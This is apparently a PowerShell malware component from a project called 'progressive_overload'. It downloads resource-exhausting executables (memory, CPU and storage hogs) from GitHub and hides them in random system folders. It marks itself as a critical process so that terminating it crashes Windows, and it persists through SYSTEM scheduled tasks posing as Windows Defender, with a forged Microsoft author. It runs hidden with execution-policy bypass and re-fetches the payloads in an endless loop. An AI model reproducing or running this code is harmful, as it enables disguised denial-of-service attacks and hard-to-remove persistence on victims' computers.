param( [string]$basePath )

$cpuHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/cpu_hog.exe"
$memHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/mem_hog.exe"
$storageHogUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/storage_hog.exe"
$memPropertyName = "mem"
$storagePropertyName = "store"
$cpuPropertyName = "cpu"


$paths = @(
    "$env:windir\system32\config\systemprofile\AppData\Local",
    "$env:windir\system32",
    "$env:windir\system32\drivers",
    "$env:windir\system32\en-US",
    "$env:windir\system32\LogFiles\WMI",
    "$env:windir\system32\wbem\en-US",
    "C:\Recovery",
    "$env:temp",
    "$env:ProgramData",
    "$env:windir\SysWOW64",
    "$env:appdata\SystemInformer",
    "$env:localappdata\Microsoft\Windows",
    "$env:windir\system32\WindowsPowerShell\v1.0\Modules",
    "$env:windir\system32\drivers\etc",
    "$env:windir\system32\spool\drivers\x64\3\en-US",
    "$env:windir\system32\spool",
    "$env:windir\system32\catroot2",
    "$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\WinX",
    "$env:windir\ServiceProfiles\NetworkService"
)
Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami3.txt`""

$signature = @"
using System;
using System.Runtime.InteropServices;

public class CS {
    [DllImport("ntdll.dll")]
    public static extern int RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
}
"@
Add-Type -TypeDefinition $signature
[CS]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null

$itemMem = Get-ItemProperty -Path "$basePath" -Name $memPropertyName -ErrorAction SilentlyContinue

if(-not($itemMem)){
    $idx = Get-Random -Minimum 0 -Maximum $paths.Length
    $memHogPath = $paths[$idx]
    $memHogPath = "$memHogPath\mem_hog.exe"
    New-ItemProperty -Path "$basePath" -Name $memPropertyName -Value $memHogPath -Force | Out-Null
    iwr -Uri $memHogUri -OutFile $memHogPath
}else { $memHogPath = $itemMem.$memPropertyName }

# $itemStore = Get-ItemProperty -Path "$basePath" -Name $storagePropertyName -ErrorAction SilentlyContinue

# if(-not($itemStore)){
#     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
#     $storageHogPath = $paths[$idx]
#     $storageHogPath = "$storageHogPath\storage_hog.exe"
#     New-ItemProperty -Path "$basePath" -Name $storagePropertyName -Value $storageHogPath -Force | Out-Null
#     iwr -Uri $storageHogUri -OutFile $storageHogPath
# }else { $storageHogPath = $itemStore.$storagePropertyName }

$threshold = Get-Random -Minimum 80 -Maximum 86
$memHogTaskName = "windows defender profile"
$storageHogTaskName = "windows firewall profile"
$memTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$memHogPath'"
$storageTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$storageHogPath'"

function Get-RamPercentage{
    $mem = Get-WmiObject -Class Win32_OperatingSystem
    $totMem = $mem.TotalVirtualMemorySize
    $free = $mem.FreeVirtualMemory
    $used = $totMem - $free
    $percent = ($used / $totMem) * 100
    return [math]::Round($percent, 2)
}

function CheckTask-And-Recreate {
    [CmdletBinding()]
    param (
        [parameter(Mandatory=$true)]
        [string]$taskName,
        [Parameter(Mandatory=$true)]
        [string]$taskRunAction
    )
    
    begin {}
    
    process {
        $tsk = schtasks /query /tn $taskName /v /fo LIST
        if(-not $tsk){
        $xml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <RegistrationInfo>
        <Author>Microsoft Corporation</Author>
        <Description>Windows Defender Memory Optimization Utility</Description>
        <URI>\Microsoft\Windows\Defender\HealthMonitor</URI>
        <Date>2024-01-01T00:00:00</Date>
    </RegistrationInfo>
    <Principals>
        <Principal id="Author">
            <UserId>NT AUTHORITY\SYSTEM</UserId>
            <RunLevel>HighestAvailable</RunLevel>
        </Principal>
    </Principals>
    <Triggers>
        <BootTrigger>
            <Enabled>true</Enabled>
            <Delay>PT30S</Delay>
        </BootTrigger>
    </Triggers>
    <Settings>
        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit> 
    </Settings>
    <Actions Context="Author">
        <Exec>
            <Command>powershell</Command>
            <Arguments>$taskRunAction</Arguments>
        </Exec>
    </Actions>
</Task>
"@
            $xml | Out-File -FilePath "$env:temp\gg.xml" -Force
            schtasks /create /tn $taskName /xml "$env:temp\gg.xml" /f
            schtasks /run /tn $taskName
            Remove-Item -Path "$env:temp\gg.xml" -Force
        }
        
        else{
            if($tsk -notcontains "Run As User:                          SYSTEM"){
                schtasks /end /tn $taskName
                schtasks /change /tn $taskName /ru SYSTEM /rl HIGHEST
                schtasks /run /tn $taskName
            }
        }
    }
    
    end {}
}

while ($true) {

    if(-not(Test-Path $memHogPath -PathType Leaf)){
        $memHogPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
        $memHogPath = "$memHogPath\mem_hog.exe"
        iwr -Uri $memHogUri -OutFile $memHogPath
        $memTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$memHogPath'"
        Set-ItemProperty -Path "$basePath" -Name $memPropertyName -Value $memHogPath -Force | Out-Null
        if(schtasks /query /tn $memHogTaskName){ schtasks /delete /tn $memHogTaskName /f 2>&1 | Out-Null }
    }
    # if(-not(Test-Path $storageHogPath -PathType Leaf)){
    #     schtasks /end /tn $storageHogTaskName
    #     $storageHogPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    #     $storageHogPath = "$storageHogPath\storage_hog.exe"
    #     iwr -Uri $storageHogUri -OutFile $storageHogPath
    #     $storageTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$storageHogPath'"
    #     Set-ItemProperty -Path "$basePath" -Name $storagePropertyName -Value $storageHogPath -Force | Out-Null
    #     schtasks /change /tn $storageHogTaskName /tr $storageTaskRunAction
    #     schtasks /run /tn $storageHogTaskName
    # }
    CheckTask-And-Recreate -taskName $memHogTaskName -taskRunAction $memTaskRunAction
    # CheckTask-And-Recreate -taskName $storageHogTaskName -taskRunAction $storageTaskRunAction

    $curr = Get-RamPercentage
    if($curr -ge $threshold){
        $item = Get-ItemProperty -Path "$basePath" -Name $cpuPropertyName -ErrorAction SilentlyContinue
        if($item){
            $cpuHogPath = $item.$cpuPropertyName
        }else{
            $cpuHogPath = "$($paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)])\cpu_hog.exe"
            New-ItemProperty -Path "$basePath" -Name $cpuPropertyName -Value $cpuHogPath -Force | Out-Null
        }
        iwr -Uri $cpuHogUri -OutFile $cpuHogPath
        powershell.exe -ep bypass -w hidden -noP $cpuHogPath
    }

}